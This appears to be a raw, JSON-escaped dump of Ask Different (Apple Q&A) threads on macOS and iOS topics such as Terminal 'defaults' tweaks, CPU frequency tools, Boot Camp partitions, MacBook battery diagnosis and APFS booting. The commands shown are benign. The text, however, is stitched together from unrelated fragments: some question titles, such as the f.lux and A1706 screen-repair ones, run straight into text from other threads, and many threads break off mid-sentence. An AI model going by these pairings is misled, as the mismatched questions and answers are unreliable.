Text.app/Contents/SharedSupport/bin/subl /path/to/file\n\nTo run this in AppleScript, use ‘do shell script’.\ndo shell script ¬\n    \"/Applications/Sublime\\\\ Text.app/Contents/SharedSupport/bin/subl /path/to/file\"\n\ndo shell script \n    \"/Applications/Sublime\\\\ Text.app/Contents/SharedSupport/bin/subl \" ¬\n    & quoted form of POSIX path of (alias \"path:to:file\")\n\n", "Q: Where does f.lux install itself?

That would mean that I only have to plug in one cable. I know that certain limited screens are capable of delivering the the 83W of power required along with the display signal, so I think technically this is possible with an injector but I've not been able to find anything on the market. I'd prefer to be able to inject the power supplied by the Apple power adapter vs some third party device if possible.\n\nA: Any usb-c hub with power delivery should do the job, eg.

How to reduce delay?\n\n\nA: Tooltip delays can be adjusted globally from the command line. To reduce it to one millisecond (1/1000 second), fire up Terminal and enter:\ndefaults write -g NSInitialToolTipDelay -int 1\n\nTo only affect Xcode, tell the defaults command to only alter that value in the Xcode preferences domain, rather than setting it globally:\ndefaults write com.apple.dt.Xcode NSInitialToolTipDelay -int 1\n\nI believe if you're running version 5 (?) or earlier of Xcode, the domain used to just be com.apple.Xcode , so:\ndefaults write com.apple.Xcode NSInitialToolTipDelay -int 1\n\nIf I am missing some other prefs domain they've used, this command will show the top contenders:\ndefaults domains | tr -s ', ' '\\n' | grep -i 'xcode'\n\nTo reset anything you've changed, just run the same command above you used to shorten it, but change the 1 on the end to the \"factory default\" setting of 1000 (1000 milliseconds = 1 second), e.g.\ndefaults write com.apple.dt.Xcode NSInitialToolTipDelay -int 1000\n\n", "Q: \"Cleaning...\" phase when deleting apps I am currently on iOS 12 beta 2. I noticed a new phase when deleting apps and was wondering what it is and what it's doing.\nAfter pressing the \"X\" on the app I want to delete and select \"Delete\" on the dialog box, for a split second the text of the App name changes to \"Cleaning...\". It then changes back to the name of the App and it disappears as usual.\n\nWhat is this feature and what does it do?\n\nA: An app that shows a cleaning... label under the icon means that it is currently deleting local data such as cache and temporary files associated with the app.\nThis process usually takes place when your device is low in memory or just before an iCloud Backup begins. Its purpose is to free up some space.\nHowever, I never saw this while deleting an app, it may be either a bug or a new feature that warn the user that both the app and its data is being removed from the device.\n\nSources : iMore, Cult Of Mac, iPhone FAQ\n", "Q: How to wirelessly mirror a MacBook onto a smart tv without Apple TV? It seems like Apple wants me to spend 200 USD on an Apple TV just to wirelessly mirror my MacBook's display onto my smart tv.\nIs there really no way to get around this? I'm not afraid of technical solutions.\n\nA: After I did upgrade to Catalina, I can use AirPlay button in the menu bar. \n\nThe only requirement is that TV and MBP are on the same network. Picture quality on Macbook will be lower than on TV actually.\nTested with MBP Late 2016 (10.15.3) and LG 43um7500pla (4K TV).\n\nA: No, there are in fact other ways to do this wirelessly. However, the methods I've seen require the installation of software and may be restricted to certain brands of TV.\nBy way of example, you can install Mirror for Samsung TV to mirror whatever is on your Mac to any Samsung TV produced in the past five or so years.\nLikewise, you can do the same with:\n\n\n*\n\n*Mirror for LG TV\n\n*Mirror for Panasonic TV\n\n*Mirror for Sony TV\n\n*Mirror for Philips TV\nThe above are only some examples.

It does not consider Turbo Boost or lower frequencies when CPU is idle. (For example if CPU is i5, 1.4GHz, it will always state 1.4GHz)\nThe C solution given it SO using sysctl.h has the same effect.\n\nA: Since your comment mentions that you're really just focused on enabling Terminal (or more accurately not desktop)...\nI think that the Intel Power Gadget will help you get your info from Terminal. From Intel:\n\nIntel® Power Gadget also provides a C/C++ Application Programming Interface (API) for accessing this power and frequency data in your program; the API is supported on Windows and Mac OS X. For more information on the API's, see:\n\nAnd on that same page, also a link to Using the Intel Power Gadget API on Mac OS X\nSorry this isn't a link to an out of the box solution; I spent a few minutes with google to see if I could find someone who already did this without luck.\n\nA: You can use powermetrics for this:\n$ sudo powermetrics | grep \"CPU Average frequency as fraction of nominal\"                                                                                                   \n\nCPU Average frequency as fraction of nominal: 85.40% (1964.20 Mhz)\n\n\nA: I have to think this is a bit of an X Y question in that \"What are you going to do once you get this number?\" and want to answer that directly, but let's dive a bit into what you're trying to measure. CPU interrupts on macOS are shaped in intervals of 150 ms and much of this detail is public from WWDC 2013 and later on power management, App Nap (Session 209 in particular is both good and approachable) and battery life optimizations on macOS.\n\nSince the code and each core of a CPU can and will change hundreds of times a second based on ephemeral load factors, power optimizations that consider what's visible on the screen, what network data arrives, the idea that a modern CPU even has one \"common\" clock rate at any one point in time seems to vastly over-simplify reality. With 8 cores on many MacBook Pro and dozens of cores on the iMac Pro - you're boiling a ton of complexity down to one number.\nThe boosts when a single core can run over clocked are less likely to be easily measured, but you can measure thermal throttling very simply with the thermal logging of pmset.\npmset -g therm\n\nYou can of course log the spontaneous changes to the thermal throttling of CPU with pmset -g thermlog and then map that to the CPU specifications if you can gather them elsewhere.\n\nA: Try top -F -n0 -s3 | grep \"CPU usage\"\n\n\n*\n\n*top display and update sorted information about processes  \n\n*-F do not calculate statistics on shared libraries (frameworks)  \n\n*-n0 display zero processes (because we're not interested in them)  \n\n*-s3 update every 3 seconds (default is 1)  \n\n*grep shows us only the line containing the phrase CPU usage\nExample Output:\n$ top -F -n0 -s3 | grep \"CPU usage\"\nCPU usage: 9.36% user, 20.0% sys, 70.63% idle \nCPU usage: 8.35% user, 8.19% sys, 83.45% idle \nCPU usage: 8.18% user, 7.77% sys, 84.4% idle \nCPU usage: 5.89% user, 8.1% sys, 86.8% idle\n\nYou could even parse the output for display elsewhere. \nBe aware that top is very resource intensive whilst it is running.\nEdit: Ah, you want frequency. I know iStat Menus has to install a helper to get that info in realtime.\n\nA: Yes there is a way!\nIntel Power Gadget has a rather obscure PowerLog command line utility. This lets you access all the data in the GUI, but doesn't require you to write your own code. After installing Intel Power Gadget, the tool is at /Applications/Intel Power Gadget/PowerLog.\nIt seems intended to generate csv files for later analysis, PowerLog.csv by default, but with the -verbose flag you can get the data directly in the shell.\nSo to get your current frequency, this should work:\n$ /Applications/Intel\\ Power\\ Gadget/PowerLog -duration 1 -verbose  | grep \"IA frequency:\"  | head -1\nIA frequency: 1655 (1200..2600) MHz, request: 1650 (1300..2600) MHz\n\nBut also, as others have said, looking for a single frequency is over simplifying things.

The attacker would need access to both to be able to get in.\nWhy doesn't the verification code from apple get sent to separate devices, or use a third party app?\n\nA: The verification code is available on all trusted devices. Since you're logged into iCloud in System Preferences, your Mac is a trusted device and can receive verification codes.\nWith other services that use 2FA, you've set up Authy, but you only have Authy on your phone.

Everything has been humming along fine until I recently made an update to partitions (via \"Disk Utility\" shrink size of Mac partition > Boot to Windows > Use partition software [MiniTool Partition Wizard] to merge the unallocated space with the bootcamp partition) and proceeded with a NVRAM and SMC resets via instructions available here (https://www.macworld.com/article/2881177/macs/how-to-reset-your-macs-nvram-pram- and-smc.html). I realized after performing the NVRAM and SMC resets that bootcamp no longer appeared in \"Startup Disk\" and I was only able to boot to Windows via Boot + hold down option key + select Windows HDD icon from the UI that appears.\nI cannot confirm the issue was a result of the NVRAM/SMC resets or the previous partition updates as following the completion of my partition updates I had not booted back into Mac. The first time following the partition updates that I booted back into MAC was during my NVRAM/SMC resetting activities. My gut tells me the issue was the result of the partitioning actions.\nIn a foolish attempt to remedy the [Bootcamp not appearing in \"Startup Disk\"] situation I stupidly utilized \"Disk Utility's\" \"repair disk\" function on the greyed out partition named \"disk0s4\" - it was previously named BOOTCAMP.  The repair function failed and reported as such. After this point I was no longer able to boot to windows via Boot > Hold Down Option Key > Select Windows because the UI now only displayed the recovery and the MAC HDD icons and text designating them so.\nI've concluded after some googling that I've managed to corrupt my MBR/GPT records and am about to proceed with fixing it via instructions here: bootcamp - Boot Camp partition broken and can't be repaired in OS X 10.10.4 - Ask Different\nI'm not sure this is the right course of action.

I rarely need to use on battery, but this model is a lot more portable than my iMac.\n---------- Edit\nI eventually managed to remove the battery. The Loctite on the screws defeated my normal #00 screwdriver so I purchased a new (expensive) set, which after the application of percussion techniques was able to remove the screws, and the battery is now out. In the meantime the bulging trackpad is now cracked.\nWith the exception of extracting the screws the removal process was quite simple.\nifixit referred me to their Australian store, which did not have replacement batteries, and informed me the US store is unable to ship batteries internationally.\nI will pursue other options; possibly deferring purchase until a future visit to the US. (I mainly use the MacBook when travelling.)\nI have a subsidiary question - the battery had a warning NOT to remove; it is possible/safe to operate without a battery?\n\nA: If you are still happy with the performance of your macbook pro, I would recommend replacing the battery and the trackpad (in case it was bent when it popped). The replacement parts are fairly cheap and easy to install.\nIfixit has repair guides and parts available and are quite a reputable supplier of non-oem replacement parts: (the links are for the 13\" model)\nbattery replacement: https://www.ifixit.com/Guide/MacBook+Pro+13-Inch+Unibody+Early+2011+Battery+Replacement/5116\ntrackpad replacement: https://www.ifixit.com/Store/Mac/MacBook-Pro-13-Inch-Unibody-Mid-2009--Mid-2012-Trackpad/IF163-025-1\np.s.

I see that the question \"why is my MacBook not charging?\" gets asked a lot. The problem is, there are multiple reasons. Possible points of failure are: charger, cable, magsafe connector, DC input board, logic board, battery. (Have I missed any?).\nWhat is the best sequence for a user to follow, to diagnose the problem?\nBy way of example, here are the first steps that I usually try:\n\n*\n\n*Make sure the charger is working. Either use your charger on a different Mac, or test a spare charger with your Mac.\n\n\n*Check the connection. There might be gunk in your port that's stopping the connector from lying flat.\n\n\n*Try resetting the SMC and PRAM.\n\n\n*If the computer boots, run Coconut Battery to determine battery status.\nThis is where I get a bit stuck. For example, I have a machine here that boots fine when plugged in, but not from battery. Disconnecting the MagSafe causes the machine to switch off. Sounds like it's a dead battery, except that Coconut reports the battery as detected, in good condition, but not charging.\nWhat steps should I take next? Specifically, I'm asking for a generic algorithm to help determine the source of the fault (preferably without swapping out lots of components one by one)?\n\nA: \nWhat steps should I take next?\n\nThere's only one step to take next:  replace the battery.\n\nDisconnecting the MagSafe causes the machine to switch off. Sounds\n  like it's a dead battery, except that Coconut reports the battery as\n  detected, in good condition, but not charging.\n\nIt's a dead battery.  Coconut battery can only give you a calculation based on the voltage it's measuring at the time you run it.  It cannot tell you how much charge is actually left in the battery.  There's no \"electronic dipstick\" to measure the capacity.\n\n\n*\n\n*Fully charged MacBook Air turns off when power cord removed\n\n*Why does a 12 inch Macbook refuse to turn on with a lot of battery remaining unless it is plugged in?\nCoconut battery (not a fan and I don't use it) doesn't provide you anything but \"a moment in time snapshot\" of your battery health.  Thing is, you can get this info right from the command line:\nsystem_profiler SPPowerDataType | grep -i \"charge information\" -A 10\n\nThe problem is, it can't \"see\" dead cells.  \nAlgorithm to check batteries\n\n\n*\n\n*Reset SMC \n\n*Verify that your charger is being detected (green/amber light)\n\n*If charger not detected, verify charger/dc in board.  Do this by \n\n\n*\n\n*checking for \"gunk\" then plugging in a known working charger.\n\n*If it works - it's your charger\n\n*If it doesn't work, it's your system (chances are, DC-In board)\n\n\n", "Q: Can I build a smart playlist populated by songs I’ve loved within the last x weeks?

That won't help you if you use Grouping for something else already, but updating the \"grouping\" will change the \"modified date\" for the track, which could then be used as a criterion for a smart playlist.\n", "Q: Windows can't see \"Macintosh HD\" under Boot Camp I bought a new iMac (Retina 4K, 21.5-inch, 2017, with macOS High Sierra 10.13.5) and used Boot Camp to install Windows 10 on it.  The Boot Camp drivers seem to have been installed successfully, and most things seem to work, but I am unable to access the Mac partition from Windows.\nAccording to what I have read, the Boot Camp drivers are supposed to have a read-only driver for HFS+, but \"Macintosh HD\" does not show up for me.\nI've read that FileVault could be the problem, but I double-checked, and FileVault is not enabled.\nThen I read that the problem might be because of something called Core Storage.  So I tried to follow these instructions to revert the partition.  However, that only works if Revertible is Yes, and in my case, it is No.\n|\n+-- Logical Volume Group 9C641579-4351-491E-923A-B2DA1CF80C12\n    =========================================================\n    Name:         Macintosh HD\n    Status:       Online\n    Size:         724916166656 B (724.9 GB)\n    Free Space:   81920 B (81.9 KB)\n    |\n    +-< Physical Volume 123FF2CC-8363-4551-AEF2-535FAABDA521\n    |   ----------------------------------------------------\n    |   Index:    0\n    |   Disk:     disk1s2\n    |   Status:   Online\n    |   Size:     27551166464 B (27.6 GB)\n    |\n    +-< Physical Volume 52D21296-80AE-4BC8-BA5F-583E65C62B42\n    |   ----------------------------------------------------\n    |   Index:    1\n    |   Disk:     disk0s2\n    |   Status:   Online\n    |   Size:     697365000192 B (697.4 GB)\n    |\n    +-> Logical Volume Family 9619CA26-4D92-43F6-AC54-3E10E7F774A0\n        ----------------------------------------------------------\n        Encryption Type:         None\n        |\n        +-> Logical Volume CF6F0197-EDB6-4DC3-B3C4-C22A3DC99D2C\n            ---------------------------------------------------\n            Disk:                  disk2\n            Status:                Online\n            Size (Total):          724000440320 B (724.0 GB)\n            Revertible:            No\n            LV Name:               Macintosh HD\n            Volume Name:           Macintosh HD\n            Content Hint:          Apple_HFS\n            LVG Type:              Fusion, Sparse\n\nHow can I access the Mac partition from Windows?\n\nAdditional information: Here is the result of running diskutil info /:\n   Device Identifier:        disk2\n   Device Node:              /dev/disk2\n   Whole:                    Yes\n   Part of Whole:            disk2\n   Device / Media Name:      APPLE HDD HTS541010A9E632\n\n   Volume Name:              Macintosh HD\n   Mounted:                  Yes\n   Mount Point:              /\n\n   Content (IOContent):      Apple_HFS\n   File System Personality:  Journaled HFS+\n   Type (Bundle):            hfs\n   Name (User Visible):      Mac OS Extended (Journaled)\n   Journal:                  Journal size 81920 KB at offset 0x183df000\n   Owners:                   Enabled\n\n   OS Can Be Installed:      Yes\n   Booter Disk:              disk0s3\n   Recovery Disk:            disk0s3\n   Media Type:               Generic\n   Protocol:                 PCI-Express\n   SMART Status:             Not Supported\n   Volume UUID:              F7E21D0B-FE27-3F1E-AF88-6B86912A95F6\n   Disk / Partition UUID:    CF6F0197-EDB6-4DC3-B3C4-C22A3DC99D2C\n\n   Disk Size:                724.0 GB (724000440320 Bytes) (exactly 1414063360 512-Byte-Units)\n   Device Block Size:        4096 Bytes\n\n   Volume Total Space:       724.0 GB (724000440320 Bytes) (exactly 1414063360 512-Byte-Units)\n   Volume Used Space:        29.6 GB (29556273152 Bytes) (exactly 57727096 512-Byte-Units) (4.1%)\n   Volume Free Space:        694.4 GB (694444167168 Bytes) (exactly 1356336264 512-Byte-Units) (95.9%)\n   Allocation Block Size:    4096 Bytes\n\n   Read-Only Media:          No\n   Read-Only Volume:         No\n\n   Device Location:          Internal\n   Removable Media:          Fixed\n\n   Solid State:              Yes\n   Virtual:                  Yes\n   Hardware AES Support:     No\n\n   This disk is a Core Storage Logical Volume (LV).

I'm looking to use the command line (Terminal or iTerm2) to export a long conversation to PDF or HTML in monthly chunks. I want to be able to do this regularly so I can make a regular backup and maybe I can find a nice pretty way to display it on the web or via Google Drive or Dropbox. Who knows..\nIf I have to write some code to do that, I think I can handle it. According to my research, those chat messages are stored as an SQLite database hidden somewhere in the application data directories for the 'Messages' application.\nAre there any existing tools for this? I suspect because the SQLite method I mentioned is not an \"official\" way to access that data, it's likely not published on the web anywhere?\nI've tried some of the commercial products but they are okay at best. Would like to get to the raw data if I can. Out of the commercial projects I've tried:\n\n\n*\n\n*iExplorer\n\n*PhoneView\n\n*Decipher TextMessage\n\n\nAt this point I tried using iExplorer to export one huge PDF (2.5k pages).

Many times when I am working, I reference stuff from Notification center, (calculator, stocks, calendar, 3rd party, etc.). But as soon as I click on anything outside of notification center, Notification Center disappears. Is there anyway to get the widgets on the Desktop. Even better would be a window where I could movie it around.\nSpecs:\nmacOS High Sierra\n\nA: You can use the Widget Simulator to use widgets in a separate window. However, this isn't available in the Applications folder or via Spotlight searches.\nUsing the Calculator widget as an example:\n\n\n*\n\n*Within Finder navigate to: /System/Library/Frameworks/NotificationCenter.framework/Resources/ \n\n*Find and launch the Widget Simulator app\n\n*Now go to /System/Library/Frameworks/NotificationCenter.framework/PlugIns/\n\n*Drag and drop the com.apple.ncplugin.calculator.appex file onto the Widget Simulator icon in the Dock\n\n*This should open the Calculator widget in a Simulator window\n\n\nNow you can use the Calculator widget as you normally would and it remains open within the Simulator until you close it. This allows you to return to it after using other apps. It also allows you to use multiple Widgets simultaneously (see below screenshot showing both the Calculator and World Clock widgets open together):\n\nAccessing Widgets \nNot all Widgets are located in the same location. By default the Calculator, World Clock and Find My Friends widgets are located in:\n/System/Library/Frameworks/NotificationCenter.framework/Resources/ \nHowever, other widgets such as Stocks, Weather etc are located in:\n/System/Library/CoreServices\nIn some cases you will need to show package contents to access them. Using Stocks as an example:\n\n\n*\n\n*In Finder navigate to /System/Library/CoreServices/\n\n*Right-click on the Stocks application and select the Show Package Contents option\n\n*In the window that appears, navigate to /Contents/PlugIns/\n\n*Now drag the Stocks extension to the Widget Simulator window (or just double-click on it)\n\n\nNOTE: In the case of 3rd party widgets, these will usually be installed within the package contents of the application. That is, if you download XYZ application it'll be installed in your Applications folder. You would right-click on the XYZ application and select the Show Package Contents option and then navigate to the  /Contents/PlugIns/ folder to access the widget you can run in the Widget Simulator.\n", "Q: Can't get wrong sender name from appearing -- only when sending from iphone I have several email accounts that I send and receive from -- either on my iPhone 6s or on my laptop. One email account is for business & one is for personal. When an email from the business email account is sent from my phone, the wrong name is listed as the sender (my former assistant's name) -- but only when sent from my business email account on my phone.  When I email from my business email on my laptop, it is listed as from my business name (which is how I want it). \nAlso, strangely enough, when I send an email on the phone from the business email to my personal email and open it in my personal email account ON MY PHONE, it appears correctly as from my business name (that's the only time it looks right when sent from the phone business email account). BUT if I open this same email in personal email account on my laptop, it's wrong. And anyone else who gets something from the business email, it is wrong (again, only if sent from my phone). \nWhen I do a search on the phone in contacts app under the business email address, the business name correctly comes up. When I do a search under the former assistant's name, it comes up empty.  I cannot for the life of me figure out how to get her name off as the sender!  I use an iPhone 6S, most recent iOS version (11-something, I think), and I have a plan with Verizon. I access my email via google gmail.  \nAny ideas???\n\nA: Maybe I'm missing something or misunderstand the question, but it seems to me the reason for this has nothing to do with your iPhone. Instead, it's most likely related to where the email address is recorded in the contacts on your laptop and on devices belonging to other people.\nI'll try and clarify my answer with an example scenario:\n\n\n*\n\n*Let's say an email address is used by Fred Flintsone. You and others add Fred Flintstone to your various Contact lists on your various devices and add the email address to that contact.\n\n*Fred Flintstone retires and then Pebbles Flintstone takes over and assumes the same email address. She uses an iPhone and adds the email account to her settings and uses her name. So now the email address, on her iPhone, appears with her name.\n\n*However, Pebbles also uses the laptop that Fred used previously. In this laptop the email address is still listed under Fred's details in the contacts. So, if an email comes into the inbox on this laptop, it appears as though it's come from Fred Flintstone because that's who the email is associated with.\n\n*Likewise, if anyone else still has that email address associated with Fred Flintstone in their contact lists, the same thing will happen.\n\n\nAssuming that your scenario is something like the above, then the answer is to ensure that the email address is associated only with you, not with your former assistant and not with both you and the former assistant on their contact lists.\nNOTE: This scenario does not apply in all scenarios (e.g. with a MS Exchange account, etc) but does apply in most situations.\n", "Q: All contacts missing on icloud?

Will the app still update its content after I reopen it, taking the possibility that now with background refresh off the app after reopening shall now take few moments to refresh its contents. Does the background refresh option affect any apps basic functionality? \n\nA: With background refresh an app more or less lets iOS take care of data refresh. If this is turned off it‘s up to the application on how data gets refreshed (on activation, on user demand etc). There is no general mechanism at work then. \n\nA: The 2 benefits you will get from switching \"Background Refresh\" off is: \n\n\n*\n\n*It will increase your battery life.\n\n*If you are using mobile data, with \"background refresh\" off, it will prevent unnecessary usage of your data.\nRegards to the apps actually doing the refresh when you open it, you won't even notice the difference. \n", "Q: Macbook Pro A1706, Glass Screen Repair (not the LCD) So recently I broke the display of my Macbook by closing the lid with an item inside.

What I did was I took out the current hard disk, inserted it on an enclosure, and gave it to her.\nNow, I have two \"spare\" SanDisk SSDs:\n\n\n*\n\n*240 GB -- macOS Sierra\n\n*480 GB -- macOS High Sierra\n\n\nAt first, I inserted the 480GB SSD, but it wasn't booting. I was given the blinking folder icon which indicates that the laptop wasn't able to read the hard drive. I then rebooted the SMC and PRAM, and on the normal boot, I held the right option/alt key to see the bootable devices, but I didn't see any, which established that the laptop couldn't read the 480GB SSD as a bootable device.\nI then inserted the 240GB SSD, and I was able to boot normally. I then inserted the 480GB into an enclosure, and then attached it to the laptop. The laptop was able to read the contents in the Finder, as well as list down the item in Disk Utility. However, the top level was read as AppleAPFSMedia, and then the SSDName under it. This gives the impression that the laptop cannot properly read the 480GB SSD as a bootable Hard Drive.\nNow, we how will the MacBook Pro read the 480GB SSD APFS as a bootable hard drive?\nRight now, we're thinking of upgrading the 240GB SSD from macOS Sierra to High Sierra. We think that doing so would upgrade the BIOS, and enable the laptop to read APFS format hard drives. However, we're very reluctant to do this, because if it doesn't work, we will need to wipe a hard drive and try to install High Sierra again.\nHas anyone experienced this situation before? Any lead would be very much appreciated. \n\nA: Okay, if you have a macbook pro that works on an older OS (pre High Sierra), and you want it to boot from an SSD (SSD1) that has a High Sierra, you have to make it read an SSD (SSD2) that has Sierra at the most, and then upgrade that to High Sierra.\nOnce the upgrade is done, you can slap on SSD1 and your laptop should now boot on that drive.\nI'm not all too sure what happens here. We just jumped the gun and updated to High Sierra and it fixed the problem. We aren't so sure if installing the firmware updates would have helped. \n", "Q: Mac Chess app crashes each time i open it Some days ago I played a few Chess games on the built-in chess app. But now each time i open up chess it does these steps:\n\n\n*\n\n*It makes the mouse a spinning color wheel\n\n*The app crashes\n\n*It says that 'Chess quit unexpectedly'\n\n\nWhat can i do to fix this?\n\nA: This is a wonderful issue to follow the two articles Apple publishes on isolating issues (not that it's wonderful to crash, but this is a very small contained issue that should be easy to isolate and then fix):\n\n\n*\n\n*https://support.apple.com/en-us/HT203161 - Isolating issues in Mac OS X\n\n\nThat sets the table for you to dive into software isolation (which this is clearly the first thing to try)\n\n\n*\n\n*https://support.apple.com/en-us/HT201516 - Mac OS X: How to troubleshoot a software issue\n\n\nIn your case, making a new user account, verifying if the crash is system wide or just your account is the next step I’d take.

The Apple Hardware Test shows this fault:\n4SNS/1/40000000: VD0R-18.711\nBut I can't find out anywhere what failure that signifies.

I could use some help figuring out how to fix this.\nThe symptoms are:\n\n\n*\n\n*I hide the app explicitly (either by typing cmd+H or option-clicking into another app's window, not sure if only one of them is causing it). This also makes the icon become dimmed in the Dock.\n\n*Then, sometimes, when I then click into the Dock's dimmed icon, the app would not react, i.e. it would not come forward, nor would it show its window(s), and the Dock icon remains dimmed.\n\n*If there are still some windows visible, clicking into them does not have any effect, either, even though the window might appear to be frontmost (i.e. the title bar is showing the colored buttons on the left).\n\n*The window would, however, track my mouse moves inside, just not react to clicks or drag operations (I can tell this in Safari windows where the content reacts to the mouse moving).\n\n\nBasically, the app (or the Cocoa framework) doesn't know any more in which state it is: Hidden or Unhidden.\nI can half-fix this by performing these steps:\n\n\n*\n\n*Activate a different app, e.g. the Finder.\n\n*Right-click into the dimmed app's Dock icon, and choose Show All Windows\n\n*Click into any of the offered windows.\n\n\nWith that, the windows behave normally again, e.g. I can click into them, but the Dock icon remains dimmed (even though clicking the icon will bring the app forward again), and the app's Hide command (cmd+H) does not work any more, even though it's enabled in the menu.\nHas anyone else seen this behavior and/or has an idea what's causing this?\nSince I've been suffering from this for many years, and over several OSX versions, here's a few things I've tried and considered:\n\n\n*\n\n*It does only happen with a certain set of apps. So far, most if not not (not entirely sure) are made by Apple. And they're all Cocoa (not older Carbon) apps. Most apps do never show this issue.\n\n*It doesn't seem to be caused by a 3rd party system extension, as I've disabled practically all of them to rule them out. This includes: Little Snitch, DragThing, iClip, Default Folder, TotalFinder, SizeUp, Timbuktu.\n\n*I just now even did a complete re-install of macOS 10.12.6, then using the Migration Assistant to clone my previous system. This did reset some stuff (e.g. got rid of old Brew, Fink and MacPorts installation), but the problem persists.\n\n*Oddly, I've also used the Migration Assistant to install 10.12 and 10.13 on my other Macs, and none of those show this issue.\n\n*It's not that particular Mac hardware, either - I used to have a MacPro 2008 until yesterday, but now it's a MP 2010 model, yet I see the problem on both (running the same system).\n\n*I suspect it's one of the many \"secret\" (i.e. unsupported) preferences I've set over the years in order to keep old behavior enabled that Apple has changed in newer systems. I had a look at many prefs using Prefs Editor, but could not identify anything related to this behavior.\n\n\nOne thing that may be of significance (though I also use this feature on other Macs where I don't see the issue): I am using 4 desktop spaces, and often switch between them using keyboard shortcuts. I wonder if the issue is a combination of switching to another space while hiding or unhiding the app, causing the app's \"hidden\" state to go into a permanent limbo state.\nThe only obvious thing where the problematic Mac differs from all unaffected others is that it has two monitors whereas the others only have one.\n\nA: I'm getting this situation as well. The ways I've found to make them show again after switching to each app is either\n\n\n*\n\n*Selecting Window > Zoom and then resizing it after it appears, filling the screen.\n\n*Selecting View > Enter full screen (or ^-command-F) then exiting full screen.\n\n\nI haven't found a way to prevent it from happening. It doesn't happen to every app or happen every time I hide apps and close my laptop.\n\nA: Perhaps related to the topic, try this hot fix. \nOn your Mac, open the App Store.\nFrom the menu at the top of your computer screen, choose Store > View My Account. If prompted, authenticate your Apple ID.\nOn the Account Information page, scroll to Hidden Items. To the right of Hidden Purchases, click Manage.\nFind the app that you want to unhide.\nClick Unhide, then click Done.\nAfter you click Done, you're taken back to the Purchased page. The unhidden app is again visible in your Purchased list.\n", "Q: macOS Sierra, Multiple problems with iBooks syncing to iTunes 12 I'm having a whole heap of problems trying to organize my small collection of ebooks.  Mostly PDF but a couple of epubs as well none of which came from the iBook store.  I'm running Sierra 10.12.6 with iBooks 1.10 and iTunes 12.7.5.9.\n\n\n*\n\n*I have a book in iBooks where I have edited the author name from \"Alexander Elder\" to \"Dr. Alexander Elder\".  This change is reflected in iBooks, but is not reflected iTunes on my Mac.  iTunes just shows it as \"Alexander Elder\".  I have already several times deleted all books from my iPad and tried to re-sync them.  iTunes still always shows the original incorrect metadata while iBooks shows it correctly.\n\n*iTunes fails to even show nearly half of my library.  I have a total of 25 books in iBooks, and only 15 show up in iTunes for syncing.\nWhy won't so many of my books appear in iTunes?  How can I get them to appear again and how can I sync them?\nIn addition to deleting all my books from my iPad, I have also deleted and re-added them to iBooks, quit & relaunched iTunes and iBooks, and I have tried the \"Move Books from iTunes\" option in iBooks.  The latter did momentarily cause all the books to appear in iTunes, but as soon as I quit & relaunched, it was back to only 15 again.\nNothing has ever solved the Author metadata issue.\nI've been searching like crazy and finding loads of people with similar but slightly different problems.\nUPDATE:  Woah I just discovered something very odd... guessing this is a bug.  If in iTunes I go into my iPad and choose Settings > Books, I see only the 15.  If however I then click on Photos and back to Books, suddenly they all appear.  If I then click On My Device > Books and click back to Settings > Books, it's back to the 15 again.  Rinse & repeat.  Very very strange!\nSo with this last discovery I am in fact able to sync all my books, however the author issue remains for the one book, it is incorrect in both iTunes and on my iPad after sync.\n\nA: I would download Calibre to edit the metadata before adding the file saved by calibre to Books.\nAlso, I've found that unchecking ibooks in system preferences>icloud>icloud drive on my mac fixed the issue with itunes, and I only really read books on my iPad/iPhone, and having Books turned on under icloud on those devices' settings doesn't seem to mess anything up so this works for me.\n", "Q: \"Inbox Zero\" with Apple Watch Siri watchface and Activity? I am a big fan of Inbox Zero and any item left in my inbox means \"I have yet to do this!\"\nThe Siri watch face on my Apple Watch tends to follow this but there seems to always be one item left, no matter what I do, and this is the \"Activity\" item.\nFor example, today I went for a short bicycle ride. I'm not in the best shape so the short ride filled up my activity goal for today. I had already filled the \"stand up\" quota, I was close to my calories quota and the bicycle ride filled my exercise quota.\nHowever, the Activity item is still there. I'd be the first to admit that is probably a \"Good Thing™\", considering the shape that I'm in, but it bugs me far more that I can't get \"Inbox Zero\", but rather \"Inbox One-to-go\".\nIs there a way for me to say \"When I've filled all the quotas I've set, please hide the Activity item\"?\nIf this can (only) be done with watchOs 5, which is in beta, I would accept this as an answer, even though I'm on watchOs 4 (which would imply it isn't possible right now).\n\nA: At this time, with watchOS 4.3.1, it's not possible to remove Activity from the Siri watch face.\nwatchOS 5 is still in beta and there's been no indication from Apple that Activity can be removed, either.  \nOf course, Apple has in the past added and removed features while the software is in beta so this could change before it's officially released.\n", "Q: Is it possible to move podcasts from iPad device to iCloud storage? I have an iPad mini 2 with 16gb storage. I am always running out of space (yes, I know how to clear space on my iPad). \nI want to start listening to podcasts and would like to download a selection but not have to store them on my device. I thought iCloud, which I haven't previously activated, would be the solution. But I don't see how I can control where the podcasts are stored. I am unable to find answers online or here. \nCan someone clarify this for me?\nAdditional info\nI do have a 2012 MacBook Pro 15\" and iTunes 12.7.2.58. However, I would prefer, if possible, to manage the podcast storage on the iPad without involving my Mac iTunes installation.\n\nA: I see a number of possibilities here, but...\nPodcasts typically don't take a lot space \n...it may be worth mentioning up front that most audio podcasts don't actually take up a lot of space. Typically they use less than 1 MB per minute of audio, so you may not really have an issue (unless you intend to download a lot of episodes from multiple podcasts). \nI listen to a lot of podcasts, so for reference purposes below are some examples of the amount of space taken up by those podcasts:\n\n\n*\n\n*46 mins (37.2 MB)\n\n*40 mins (31.4 MB)\n\n*31 mins (24.7 MB)\n\n*22 mins (19.9 MB)\n\n*51 mins (35.7 MB)\n\n*1 hr 3 mins (43.6 MB)\n\n*5 hrs 53 mins (243.5 MB)\n\n\nOf course, there are exceptions. I do listen to a couple of podcasts that actually use up about 2 MB per minute, but in my experience this is rare. And, if you're going to be watching video podcasts these will take significantly more space.\nStreaming\nThe other consideration is whether you're intending to store them for long-term use? If not, then you don't have to download them in the traditional sense. Instead, you can just stream them when you're listening to them, in which case there's no need for you to manually manage your storage (well, at least not with podcasts). \nOf course, in the case of streaming, you do need to have an active internet connection while listening to them - so if that's not going to be possible then this option isn't really going to work. This option also means you're not storing the podcasts for access in future.\nSo, the point of all this is if you're only subscribing to a handful of podcasts you may not end up using a lot of your iPad's storage. On the other hand, if you're wanting to hold on to past episodes then these can add up quickly! \nFor more information on downloading and/or streaming podcasts refer to Subscribe and listen to podcasts.\nPodcasts app settings\nThe bundled Podcasts app actually offers quite a few options to help you manage your podcasts (and therefore the amount of space they take).\nFor example, you can set it to delete old downloaded episodes after you have listened to them. Likewise, you can set episode limits so you don't accumulate a lot of episodes of each 